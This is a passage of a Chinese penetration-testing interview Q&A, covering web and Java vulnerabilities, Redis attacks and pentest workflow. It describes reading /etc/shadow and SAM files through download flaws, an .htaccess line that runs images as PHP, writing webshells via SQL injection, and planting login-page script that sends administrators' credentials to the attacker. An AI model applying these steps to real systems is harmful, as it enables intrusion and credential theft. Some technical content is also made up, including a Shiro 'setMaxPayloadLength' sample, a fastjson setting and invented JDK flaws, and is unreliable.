start="21"><li>越权以及逻辑漏洞问题</li></ol><p>越权漏洞是指应用程序未对当前用户操作的身份权限进行严格校验，导致用户可以操作超出自己管理权限范围的功能，从而操作一些非该用户可以操作的行为。越权漏洞是一种常见的安全漏洞，属于“失效的访问控制”的问题，指其它用户能够执行本身没有资格执行的一些操作。</p><p>分类：<br>水平越权：攻击者可以访问其它同级用户的资源或数据。<br>垂直越权：攻击者可以访问更高权限用户的资源或数据。<br>交叉越权：拥有水平越权和垂直越权的权限。</p><p>常见原因包括：<br>开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。<br>应用程序没有对用户的身份进行严格校验，例如使用了弱密码或没有使用权限验证。<br>应用程序的设计存在缺陷：例如没有对敏感数据进行加密。<br>通过隐藏URL，直接对象引用，多阶段功能，静态文件，平台配置错误。</p><p>检测：通过特定传参的更改来发现越权漏洞。</p><p>防御措施：<br>严格校验用户的身份权限，例如强密码、进行权限验证、对敏感数据进行加密等。<br>使用安全的编码规范，例如避免使用弱密码、使用安全的编程语言和框架等。<br>定期进行安全扫描，发现和修复越权漏洞。<br>前后端验证，关键操作前验证身份</p><ol start="22"><li>验证码绕过有哪些方法？</li></ol><p>验证码(CAPTCHA)是“Completely Automated Public Turing test to tell Computers and Humans Apart”全自动区分计算机和人类的图灵测试的缩写。<br><img src="/simg/captcha1.jpg" alt="占比"><br>(1) 验证码固定之无条件不刷新：不刷新验证码绕过。<br>(2) 验证码固定之有条件不刷新：不通过其条件绕过。<br>(3) 验证码前端可获取：验证码隐藏在源码或cookie中。<br>(4) 仅在客户端生成验证码：本地js验证<br>(5) 验证码薄弱：使用插件或工具(PKAV HTTP FUzzer)识别。<br>(6) 验证码爆破登录：抓包丢进工具爆破。<br>(7) 验证码可控制：验证码包含在URL里面，是一个URL传参，可以把URL设置定，验证码可控制。<br>(8) 空验证码绕过：可以通过删除验证码参数或cookie中的值判断，进行暴力破解。<br>(9) 万能验证码：无论是什么，只要输入000000就能直接绕过。<br><a href="https://www.freebuf.com/articles/network/276509.html">验证码绕过、密码找回漏洞</a><br><a href="https://xz.aliyun.com/t/12557">绕过滑块验证码拿到高危漏洞</a></p><ol start="23"><li>分别说出iis，apache，nginx解析漏洞原理</li></ol><p>IIS解析漏洞（也称为IIS路径遍历漏洞）原理：IIS服务器会根据URL中文件的扩展名来判断文件类型，并将其交给相应的处理程序进行处理。攻击者可以利用这一点，构造特殊的URL，让IIS服务器将非脚本文件误认为脚本文件，从而执行恶意代码。</p><p>Apache解析漏洞（也称为Apache漏洞或.htaccess漏洞）原理：Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析。<br>比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p><p>Nginx解析漏洞原理：该漏洞通常是由于Nginx服务器配置不当导致的，攻击者可以通过发送特制的HTTP请求并利用Nginx基于路径转换的问题来访问受限文件。攻击者通过发送带有特定构造的HTTP请求，欺骗服务器将请求转换为其他路径，从而绕过了服务器的访问控制。<br>比如：攻击者可以使用..&#x2F;，.&#x2F;，%2e%2e&#x2F;等字符序列来尝试绕过服务器的访问限制，访问服务器上其他目录中的文件。</p><ol start="24"><li>任意下载漏洞攻击原理及测试方法</li></ol><p>任意文件下载漏洞(Arbitrary File Download Vulnerability)原理：攻击者构造特殊的请求，让服务器下载指定文件。<br>测试方法：<br>注册合法账号登入平台，避免被系统禁止访问。不能造成系统的损坏，记录结果。<br>手动或使用工具（dirbuster, burpsuite）查找常见接口点，比如 <code>download.php?path=  down.php?file=  &amp;src=  &amp;inputfile=</code> ，也可使用Google hacking <code>inurl:&quot;readfile.php?file=&quot;</code><br>尝试下载系统文件( <code>/etc/passwd   /etc/shadow   /etc/sudoers</code> )，数据库文件( <code>/var/lib/mysql/</code> )，其它敏感文件( <code>/home/admin/</code> )</p><p><a href="https://blog.csdn.net/weixin_43148062/article/details/105496744">渗透测试-任意文件下载漏洞</a></p><ol start="25"><li>xxe漏洞攻击原理是什么？如何找xxe漏洞及攻击方法</li></ol><p>见问题13</p><ol start="26"><li>xxe攻击在无回显的时候是怎么突破的？</li></ol><p>见问题13</p><ol start="27"><li>如何防范xxe漏洞？</li></ol><p>见问题13</p><ol start="28"><li>越权问题有哪些？实战</li></ol><p>越权见问题24</p><p>实战：<br>攻击场景：<br>(1) 登录<br>未授权访问:可尝试修改响应码，从链接访问从而绕过，人为疏忽导致密码暴露。<br>身份或登录信息伪造：将身份或登录信息简单编码(Base64)加密(MD5)后放在链接中或数据包中<br>(2) 数据<br>身份信息伪造：身份校验采用明文或简单编码加密。<br>数据篡改：正负值反冲，修改订单数据，修改商品ID等。发送信息或邮件等可以尝试爆破构成短信&#x2F;邮件轰炸。<br>流程越过：越过中间校验步骤直接进行后续操作。<br><a href="https://www.freebuf.com/vuls/313396.html">实战中的越权攻击总结</a></p><ol start="29"><li>URL跳转漏洞</li></ol><p>URL跳转漏洞（Open Redirect Vulnerability）是一种常见的Web安全漏洞，攻击者可通过构造恶意链接，引导用户跳转到恶意网站，从而窃取用户敏感信息等。常见的URL跳转漏洞发生原因一般是在程序中没有对跳转URL进行有效的过滤和校验，攻击者可以通过构造链接，在跳转URL中注入恶意代码或者外部URL，从而实现对跳转流程的控制。<br>绕过方式：@绕过，?绕过，#绕过，斜杠(&#x2F;)绕过，反斜杠(\)绕过，白名单匹配绕过，xip.io绕过，协议绕过，xss跳转。<br>fuzz的参数： <code>redirect, url, redirecturl, callback, return_url, toUrl, jump, target, to, link, domain</code></p><p>实战：登录跳转，充值接口跳转，xss造成的url跳转</p><ol start="30"><li>ARP欺骗的方法有哪些？说说原理</li></ol><p>见问题14</p><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li>如果遇到waf的情况如何进行sql注入&#x2F;上传webshell怎么做？请写出曾经绕过WAF的经过。</li></ol><p>遇到waf首先查看是哪家的waf，然后网上查找相关资料或询问有关人员根据waf的漏洞进行绕过。</p><ol start="2"><li>拿到一个待测的站，首先应该做什么？</li></ol><p>信息收集：获取域名的whois信息，注册者邮箱电话等。通过站长之家，明小子，k8等查询服务器旁站，C段及子域名站点。服务器操作系统的版本、中间件、数据库类型，前端语言，后端语言，开放端口，真实IP，网站指纹。Google hack进一步收集网站信息，后台，敏感文件等。qq，邮箱，身份证，电话使用社工库反查。</p><p>漏洞扫描：nmap，御剑，dirbuster，sqlmap，burp，metasploit，nessus，AWVS，goby</p><p>漏洞利用…<br><a href="https://blog.csdn.net/m0_45097365/article/details/122831464">渗透测试流程</a></p><ol start="3"><li>判断出网站的CMS对渗透有什么意义？</li></ol><p>可以查找已知的漏洞了解弱点，如果是开源CMS，可以将源码下载进行审计。</p><ol start="4"><li>一个成熟并且相对安全的CMS，渗透时扫目录的意义？</li></ol><p>敏感文件、二级目录扫描<br>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p><ol start="5"><li>在某后台新闻编辑界面看到编辑器，应该先做什么？</li></ol><p>查看编辑器的名称版本,然后搜索公开的漏洞。</p><ol start="6"><li>拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</li></ol><p>能做很多事，如上传.htaccess文件并上传图片码，获取网站的权限<br>插入 <code>&lt;FilesMatcher &quot;xxx.jpg&quot;&gt; SetHandler application/x-httpd-php</code> .jpg文件会被解析成.php文件。<br>.htaccess 文件可以用来重写 URL，这是比较常见的一种用法。攻击者可以使用它来欺骗用户，让用户访问一个恶意网站，或者重定向到钓鱼站点等</p><ol start="7"><li>注入漏洞只能查账号密码？</li></ol><p>还可以修改数据库，进行DDoS攻击，执行任意代码。</p><ol start="8"><li>安全狗会追踪变量，从而发现是一句话木马吗？</li></ol><p>不是，是根据特征码，所以只要更改特征码即可。</p><ol start="9"><li>.access扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？</li></ol><p>迅雷下载，直接改后缀为.mdb</p><ol start="10"><li>如何利用这个防注入系统拿shell？<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">某个防注入系统，在注入时会提示：</span><br><span class="line">系统检测到你有非法注入的行为。</span><br><span class="line">已记录您的IP:xxx.xxx.xx.xx</span><br><span class="line">时间:yy:mm:dd</span><br><span class="line">提交页面: test.asp?id=15</span><br><span class="line">提交内容: and 1=1</span><br></pre></td></tr></table></figure></li></ol><p>在URL里面直接提交一句话，然后网站就会把提交内容记录进数据库文件，之后尝试查找网站的配置文件，使用shell连接工具(如：蚁剑)</p><ol start="11"><li>上传大马后访问乱码时，有哪些解决办法？</li></ol><p>浏览器中改编码</p><ol start="12"><li>审查上传点的元素有什么意义？</li></ol><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制。</p><ol start="13"><li>目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</li></ol><p>直接爆破用户名。根据报错信息判断出哪些用户是存在的。然后利用爆破出的用户名更改密码。</p><ol start="14"><li>以下条件有什么思路？<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标站发现某txt的下载地址为：</span><br><span class="line">http://www.test.com/down/down.php?file=/upwdown/1.txt</span><br></pre></td></tr></table></figure></li></ol><p>下载漏洞。已经知道下载点了，直接尝试下载敏感文件配置文件等。如 <code>linux下可以: /etc/passwd  /etc/shadow   Windows下可以: C:\Windows\win.ini  C:\Windows\repair\sam</code> 。也可以输入index.php下载首页文件，然后在首页文件里查找其它文件网站的配置文件，找出网站的数据库密码和数据库的地址。</p><ol start="15"><li>甲给你一个目标站，并且告诉你根目录下存在&#x2F;abc&#x2F;目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</li></ol><p>直接在网站二级目录 <code>/abc/</code> 下扫描敏感文件及目录。</p><ol start="16"><li>在有shell的情况下，如何使用xss实现对目标站的长久控制？</li></ol><p>后台登录处加一段记录登录账号的JS，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件或直接发到自己的网站文件中。（此方式适合有价值且需要深入控制权限的网络）<br>在登录后才可以访问的文件中插入XSS脚本。</p><ol start="17"><li>发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取webshell，哪种是优选？</li></ol><p>有写入权限的，构造联合查询语句使用 using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个Shell，这样效率更高。通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p><ol start="18"><li>CSRF和XSS和XXE有什么区别，以及修复方式？</li></ol><p>XSS 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用 HTTP Only 来禁止 JavaScript 读取 Cookie 值、输入时校验、浏览器与 Web 应用端采用相同的字符编码。</p><p>CSRF 是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范 CSRF 的页面然后嵌入 Token、再次输入密码、检验 Referer</p><p>XXE 是 XML 外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML 解析库在调用时严格禁止对外部实体的解析。</p><ol start="19"><li>CSRF、SSRF和重放攻击有什么区别？</li></ol><p>CSRF 是跨站请求伪造攻击，由客户端发起<br>SSRF 是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p><ol start="20"><li>XSS、CSRF、CRLF比较容易弄混，说说三者的原理，防御方法。</li></ol><p>CSRF跨站请求伪造，构造已知的所有参数让对方访问。</p><p>防护CSRF原理：防御原理：不让你那么容易伪造请求（cookie中加入随机数，要求请求中带上，而攻击者获取不到cookie中的随机数，验证HTTP Referer字段，在请求地址中添加token字段）</p><p>CRLF原理：HTTP拆分攻击（HTTP Splitting），CRLF是“回车+换行”（\r\n）的简称。<br>在HTTP协议中，HTTP Header与HTTP body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头的字符，注入一些恶意换行，这样就能注入一些会话Cookie或HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><ol start="21"><li>owasp漏洞都有哪些？</li></ol><p>(1) 失效的访问控制<br>(2) 加密机制失效<br>(3) 注入<br>(4) 不安全的设计<br>(5) 安全配置错误<br>(6) 易受攻击和过时的组件<br>(7) 识别和认证失败<br>(8) 软件和数据完整性故障<br>(9) 安全日志记录和监控失败<br>(10) 服务端请求伪造SSRF<br><a href="https://www.secrss.com/articles/55490">2023 OWASP API Security Top 10</a><br><a href="https://blog.csdn.net/Gherbirthday0916/article/details/126786601">2022 OWASP</a></p><ol start="22"><li>渗透测试中常见端口？</li></ol><p>文件共享服务端口：21(FTP), 22(SSH), 69(TFTP)<br>远程连接服务端口：22(SSH), 23(Telnet), 3389(RDP), 5900(VNC)<br>Web应用服务端口：53(DNS), (80, 443, 8080, 8443)(HTTP&#x2F;HTTPS), 7001(Weblogic)<br>数据库端口：1433(MSSQL), 1521(Oracle), 3306(MySQL), 5432(PostgreSQL), 27017(Mongodb), 6379(Redis)<br>邮件服务端口：25(SMTP), 110(POP3), 143(IMAP)<br><a href="https://blog.51cto.com/jayjaydream/5850365">渗透测试入门15之常见端口安全测试</a><br><a href="https://www.freebuf.com/articles/web/333481.html">常见端口攻击方式</a></p><ol start="23"><li>网站渗透流程</li></ol><p>(1) 信息收集<br>包括目标确认和公开情报收集。<br>(2) 主动探测<br>包括主动扫描，人工浏览、逐个请求burp，自动化。<br>(3) 漏洞挖掘<br>漏洞扫描工具，挖掘漏洞<br><a href="https://www.freebuf.com/articles/web/270202.html">渗透测试全流程总结</a></p><ol start="24"><li>发现一个大范围影响的新漏洞，如何快速排查公司资产？</li></ol><p>(1) 了解漏洞的影响范围。包括漏洞类型、漏洞利用条件、漏洞危害等。根据漏洞影响范围，可以初步判断公司资产是否存在风险。<br>(2) 制定排查方案。根据漏洞的影响范围，制定排查方案。排查方案应包括排查资产范围、排查方法、排查流程、排查工具等。<br>(3) 快速排查资产。排查过程中应重点关注：使用了漏洞软件或设备的资产，存储了敏感数据的资产，连接到互联网的资产。<br>(4) 确认漏洞存在情况。排查完成后，需要确认漏洞是否存在于公司资产中。确认方法可以通过漏扫工具、人工检测等。<br>(5) 采取措施修复漏洞。如果确认漏洞存在，应立即采取措施修复漏洞。措施可采用升级软件、补丁修复等。</p><ol start="25"><li>怎样对一个站去挖nday</li></ol><p>首先进行信息搜集，确认已知漏洞。找到已知漏洞后，我们可以从网上找到已知漏洞的payload，尝试挖掘。</p><ol start="26"><li>跟过哪些nday，怎样一个思路</li></ol><p><a href="https://paper.seebug.org/2033/">WSO2文件上传漏洞</a></p><p><a href="https://www.cnblogs.com/R3col/p/16094132.html">Django SQL注入漏洞</a></p><ol start="27"><li>挖到过0day吗</li></ol><p>没有。</p><ol start="28"><li>代码审计</li></ol><p>有审计过VAudit，使用了Seay源代码审计系统。<br>审计出的漏洞有：<br>(1) 文件包含。源代码未进行严格过滤，仅添加后缀inc。直接创建shell.inc文件，写一句话木马。蚁剑连接成功。<br>(2) sql注入。在留言界面未对用户输入的id字段做检测，仅有敏感字符替换。因为替换字段中 <code>||</code> 被替换为空，所以我们可将其插入到敏感字符中间绕过。<br>(3) 反射型XSS。搜索留言处存在。<br>(4) 登录次数未做限制可爆破。登录处，管理员账户。无验证可python爆破，有验证burp爆破。<br>(5) 命令执行。<br>(6) 任意文件读取。查看avatar.php源代码：存在危险函数 <code>file_get_contents</code> ，通过代码审计发现 <code>$_SESSION[&#39;avatar&#39;]</code> 。数据可控。<br>(7) 安装漏洞。查看install.php的代码时就算存在install.lock文件依然会执行后面的代码，数据库连接参数由用户上传可控，仅对dbname做了重复检测，未对参数进行校验，可进行SQL注入。使用反引号使SQL语句合法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&quot;;phpinfo();//`</span><br></pre></td></tr></table></figure><p>跟着文章审计过XXE漏洞。解密通达OA后，在日程安排功能点处，发现导入日程的说明描述是可上传XML格式文档。那么也可能解析XML实体，于是抓包去路由，查看版本并利用。详看文章。</p><p><a href="https://blog.csdn.net/akucoco/article/details/129032037">VAudit代码审计从0到1，思路记录</a><br><a href="https://www.freebuf.com/articles/web/341238.html">如何通过代码审计大型OA系统拿到CNVD证书</a><br><a href="https://juejin.cn/post/7129298288389390367">PHP代码审计（六）Seay源代码审计系统使用教程</a></p><ol start="29"><li>app渗透经历</li></ol><p>做过一个app渗透，大概是在去年暑假刚开始的时候，身边有个人被诈骗了。是在某个app内，所以我就尝试进行app渗透。如下：<br><a href="https://www.wangan.com/p/7fy7fx71176412a7">实战|从app渗透到网站沦陷</a><br><a href="https://blog.csdn.net/weixin_40228200/article/details/128474830">APP应用渗透测试思路</a></p><ol start="30"><li>redis利用姿势及环境差异</li></ol><p><strong>Linux</strong>：<br>(1) 未授权访问：默认直接绑定在0.0.0.0:6379，密码为空，未对ip、端口等限制，攻击者可未授权访问redis，轻则获取数据，重则配合其它漏洞取得服务器权限。redis3.2版本新增protected-mode，默认yes，外部网络无法访问redis服务。<br>利用方式：直接nmap扫描，然后直连。<br>(2) 利用config写配置文件。<br>利用方式：直连到redis后，一句话木马写入webshell。<br>Ubuntu下利用定时任务反弹shell<br>(3) 模块加载rce。redis4.0以上区别于以下的版本在于其多出一个模块，允许我们加载外部的so文件，实现在redis内执行我们的自定义命令，可以理解我们可以自写插件来扩展redis的功能。<br>利用方式：如果拿到webshell之后，登录redis后通过webshell上传动态链接库即so文件后，通过redis的moudle load加载动态链接库即可rce。权限一般可满足<br>(4) 主从复制RCE。主从复制是指将一台redis服务器的数据，复制到其它的redis服务器。前者称之为主节点(master)，后者称之为(slave)；主从复制是单向的，只能由主节点到从节点。<br>利用方式：通过全量复制。尝试在服务器中nc一个端口，然后我们的redis用slaveof命令<br>(5) SSRF打redis。SSRF因为一个gopher协议大大拓宽了攻击面，使用过gopher的会知道我们需要对需要发送的包进行抓包然后编码通过gopher协议进行发送。<br>利用方式：根据redis的数据格式伪造将webshell、ssh、定时任务等进行编码后通过gopher协议发送到存在着redis的机器上，就可以达成ssrf打redis。</p><p><strong>Windows</strong>：<br>(1) 写无损文件。<br>利用方式：使用工具RedisWriteFile。<br>(2) getshell。<br><a href="https://blog.csdn.net/weixin_50464560/article/details/121095951">Redis利用方式总结(Linux&#x2F;Windows)</a></p><ol start="31"><li>fastjson回显&#x2F;fastjson远程命令执行漏洞</li></ol><p>fastjson用于将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。</p><p>fastjson回显是指在使用fastjson解析json数据时，由于fastjson存在反序列化漏洞，攻击者可以通过构造恶意json数据，将恶意代码注入到服务端，从而实现远程代码执行、数据库操作等攻击。</p><p>fastjson回显漏洞主要存在于fastjson的 <code>JSON.parse()</code> 方法中，该方法用于将json字符串解析为Java对象。fastjson在解析json数据时，会将json字符串中的所有键值对都转换为Java对象，其中包括恶意代码。</p><p>利用BCEL打fastjson直接burp回显getshell<br>基于dbcp的fastjson rce回显<br>fastjson &lt;&#x3D; 1.2.24</p><p>渗透总结：<br>1、反序列化常用的两种利用方式，一种是基于rmi，一种是基于ldap。<br>2、RMI是一种行为，指的是Java远程方法调用。<br>3、JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。<br>4、ldap指轻量级目录服务协议。</p><p>fastjson 1.2.24反序列化导致任意命令执行漏洞（CVE-2017-18349）<br>漏洞原理<br>FastJson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p>防御：<br>升级fastjson到最新版本，最新版本已经修复了该漏洞。<br>在fastjson的配置文件中，设置 <code>deserializerFeatures</code> 属性为 <code>SerializerFeature.DisableFeatures.AUTO_DESERIALIZE_ENUM</code> ，该属性可以禁止fastjson自动反序列化枚举类型，从而防止攻击者利用枚举类型进行攻击。<br>使用第三方安全工具进行检测和修复。</p><p><a href="https://www.freebuf.com/articles/web/283585.html">Fastjson远程命令执行漏洞总结</a></p><ol start="32"><li>jndi注入及原理</li></ol><p>JDNI注入是指攻击者通过控制JNDI查询参数，将恶意代码或对象注入到JNDI服务中，从而导致远程代码执行的漏洞.<br>JNDI(Java Naming and Directory Interface)是Java提供的命名和目录接口。通过调用JNDI的API可以定位资源和其它程序对象。<br>JNDI是Java EE的重要部分，JNDI可访问的现有目录及服务有：JDBC, LDAP, RMI, DNS, NIS, CORBA.</p><p>JNDI注入，即当开发者在定义JNDI接口初始化时， <code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的url传入参数远程加载恶意载荷，造成注入攻击。</p><p><a href="https://xz.aliyun.com/t/12277">JNDI注入原理及利用考究</a></p><ol start="33"><li>Java回显</li></ol><p>(1) defineClass<br>(2) RMI绑定实例<br>(3) URLClassLoader抛出异常<br>(4) 中间件<br>(5) 写文件css、js<br>(6) dnslog</p><p><a href="https://xz.aliyun.com/t/7740">Java 反序列化回显的多种姿势</a></p><ol start="34"><li>泛微oa xstream的回显(jdk1.8和jdk1.7的差异)</li></ol><p><a href="https://cangqingzhe.github.io/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">泛微xstream</a></p><ol start="35"><li>shiro限制payload长度</li></ol><p>Shiro是一个流行的Java安全框架，可以作为应用程序的身份验证和授权解决方案。<br>在Shiro中，有一个限制payload长度的设置可以增加应用程序的安全性。<br>shiro限制payload长度的主要方法是设置SecurityManager的subjectFactory属性。subjectFactory属性用于创建subject对象，可以通过设置该属性的maxPayloadLength属性来限制payload的长度。<br>示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DefaultSubjectFactory</span> <span class="variable">subjectFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSubjectFactory</span>();</span><br><span class="line">subjectFactory.setMaxPayloadLength(<span class="number">1024</span>);</span><br><span class="line"><span class="type">SecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSecurityManager</span>(subjectFactory);</span><br></pre></td></tr></table></figure><p>该配置将限制payload的长度为1024字节。</p><p>除此之外还有：<br>在shiro的配置文件中设置SecurityFilterChain的filters属性。filters属性用于指定shiro的过滤器链，可以通过添加PayloadLengthFilter过滤器来限制payload的长度。<br>在shiro的配置文件中设置SecurityManager的subjectFactory属性的maxPrincipalLength属性。maxPrincipalLength属性用于限制principal的长度，principal是用于表示用户身份的对象。</p><ol start="36"><li>Java回显的通用思路以及不同版本jdk的差异</li></ol><p>Java回显的通用思路：<br>1、选择回显通道：首先，选择一个通道，通过该通道可以接收到目标系统的响应。通常使用的回显通道包括DNS、HTTP、SMTP等。<br>2、构造恶意Java对象：创建一个Java对象，该对象会在目标系统中触发漏洞或执行特定操作。通常，这需要深入了解目标系统上的漏洞或弱点，并构造适当的Java序列化对象来利用这些弱点。<br>3、序列化和发送对象：使用Java的序列化机制，将恶意对象序列化为字节流。然后，通过选择的通道将字节流发送到目标系统。<br>4、等待回显：监视回显通道，等待目标系统的响应。响应通常是由目标系统执行恶意对象引发的操作所触发的。<br>5、解析和分析回显：一旦收到回显，解析响应以确定是否成功触发了漏洞或执行了目标操作。这可能包括查看响应内容、状态码、错误消息等。<br>6、根据结果采取行动：根据回显的结果，确定目标系统是否受到漏洞的影响，并采取进一步的行动，例如报告漏洞或利用漏洞。</p><p>jdk7 存在Apache Commons Collections中的Collections.unrollMap方法的反序列化漏洞，可执行任意代码。安全配置方面：开发人员可以使用ObjectInputFilter来配置白名单规则以确保反序列化处理的对象合法可信，并使用 Javadoc 文档中提供的安全基线配置来提高安全性。<br>引入了新的特性，如try-with-resources语句，有助于更安全地处理资源关闭。</p><p>jdk8 存在Apache Commons Collections中的TransformerFactory.getClassLoader方法的反序列化漏洞，可被攻击者利用获取敏感信息。安全配置：引入了强化的Java安全管理器（Java Security Manager），默认情况下禁用了许多危险的操作。引入了全新的安全特性，如Strengthening Password-based Encryption，增强了密码散列算法（例如PBKDF2）。</p><p>jdk9 引入了模块化系统（Project Jigsaw），提供更好的代码隔离和控制，有助于减少潜在的安全问题。<br>引入了多版本JAR文件，有助于解决一些依赖性问题，从而提高安全性。</p><p>jdk11 JDK的ssl库存在信息泄露漏洞，攻击者可以针对受害者获取机密的信息。安全配置有通过设置Java安全管理器的allowList属性来指定允许反序列化的类。是一个LTS（长期支持）版本，将在较长时间内接收安全补丁和维护。引入了新的HTTP客户端（替代HttpURLConnection），提供更好的性能和安全性。</p><ol start="37"><li>Rootkit是什么意思</li></ol><p>rootkit是一种恶意软件，它可以隐藏自身和其它恶意软件，从而使攻击者可以获取对受感染系统的完全控制。rootkit通常使用系统漏洞来安装，并使用各种技术隐藏自身和其它恶意软件。</p><p>常见类型：<br>内核rootkit：内核rootkit是安装在操作系统内核中的rootkit，可访问和修改操作系统的所有部分，使其非常难以检测和删除。<br>文件系统rootkit：文件系统rootkit是安装在文件系统中的rootkit。文件系统rootkit可以隐藏自身和其他恶意软件，使其难以检测和删除。<br>网络rootkit：网络rootkit是用于攻击网络的rootkit。网络rootkit可以用于窃取敏感信息、进行远程攻击或破坏系统。</p><p>rootkit示例：Stuxnet, Flame, Necurs.</p><p>检测：比较困难。可根据特征推测，如蓝屏，异常网络浏览器行为，设备性能缓慢，Windows设置未经许可修改，网页运行不正常。<br>清除：如果有深度感染唯一办法是重装系统。<br><a href="https://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkit">什么是 Rootkit</a></p><ol start="38"><li>手工查找后门木马的小技巧</li></ol><p>1、首先最需要注意的地方是系统的启动项，可以在“运行”-输入“msconfig 命令” 在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，因为在后门木马中大部分都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；</p><p>2、查看系统关键目录 system32 和系统安装目录 Windows 下的文件，xp 系统下两者默认路径分别是 C:\WINDOWS\system32 和 C:\WINDOWS\。然后最新修改的文件中有没有可疑的可执行文件或 dll 文件，这两个地方都是木马最喜欢的藏身的地方了（小提示：一定要设置显示所有的文件的文件夹哦）。</p><p>3、观察网络连接是否存在异常，还有“运行”-“cmd”- <code>netstat -an</code> 查看有没有可疑或非正常程序的网络连接，尤其注意一下远程连接的端口，如果有类似于 8000 等端口就要注意了，8000 是灰鸽子的默认端口，记得有一次自己就在后门木马测试的网络连接中发现 8000 端口，当然意思不是说只要没有 8000 端口的网络连接就一定安全，因为 8000 端口只是灰鸽子上线的默认端口，并且端口是可以更改的。</p><p>通过以上方法，可以查找到电脑的一些可疑文件，如果确认无疑，就可以手工进行删除了。当然还可以借助杀毒软件的力量。如果你真的中了木马后门，不用慌。最好最彻底的方法是重装系统后，在安全模式下，利用最新病毒库的杀软进行查杀。</p><ol start="39"><li>常见web安全漏洞</li></ol><p>sql注入，文件上传，xss，文件包含，CSRF，SSRF，XXE，SSTI，反序列化，RCE，目录穿越，逻辑漏洞，中间件。</p><ol start="40"><li>永恒之蓝的漏洞原理是什么？怎么做到的？ms17-010</li></ol><p>原理：攻击者可以通过发送一个特制的SMB请求，导致Windows内核中的SmbSessionNegotiate函数发生缓冲区溢出。攻击者可以利用该漏洞执行任意代码，从而获得对受感染系统的完全控制。<br>漏洞类型：缓冲区溢出。<br>漏洞危害：攻击者可以利用该漏洞执行任意代码，从而获得对受感染系统的完全控制。</p><ol start="41"><li>针对PHP的弱类型，有哪些漏洞？</li></ol><p>(1) 类型转换漏洞：由于PHP的弱类型变量，在进行比较运算时会自动进行类型转换，攻击者可以利用此特性来触发特定的条件判断。例如，攻击者可以在比较两个值时传递一个特殊的参数，导致预期以外的结果。<br>(2) 对象漏洞：PHP中的对象也可以受到弱类型的影响，可能导致意外行为。要防范此类问题，应该在操作对象之前验证其类型和属性。<br>(3) 比较漏洞：PHP中的比较操作符（例如&#x3D;&#x3D;）在比较不同数据类型时可能会导致问题。攻击者可以利用类型弱化来绕过预期的条件。<br>(4) 数组漏洞：PHP中的数组也可以是弱类型的，这可能导致问题。例如，如果未初始化一个数组并尝试访问其元素，PHP可能会自动将数组初始化为空数组。为了防止这种情况，建议始终明确初始化数组并验证输入。<br>(5) SQL注入漏洞：由于弱类型变量的存在，攻击者可以通过传递恶意的SQL查询来注入数据库。攻击者可以伪造一个查询或输入等操作，绕过服务器端的验证和过滤机制，最终达到执行数据库操作的目的。</p><p>采取措施：<br>为了防范PHP中的弱类型漏洞，建议进行严格的输入验证、类型检查和转换，并使用适当的安全编码实践来确保应用程序的安全性。</p><ol start="42"><li>代码审计方面，有过对大型cms的审计吗？发现过哪些漏洞？</li></ol><p>同28题。</p><ol start="43"><li>针对PHP的语言特点，说几个常见漏洞？</li></ol><p>同41题。</p><ol start="44"><li><p>burpsuite加密用什么模块bp加密 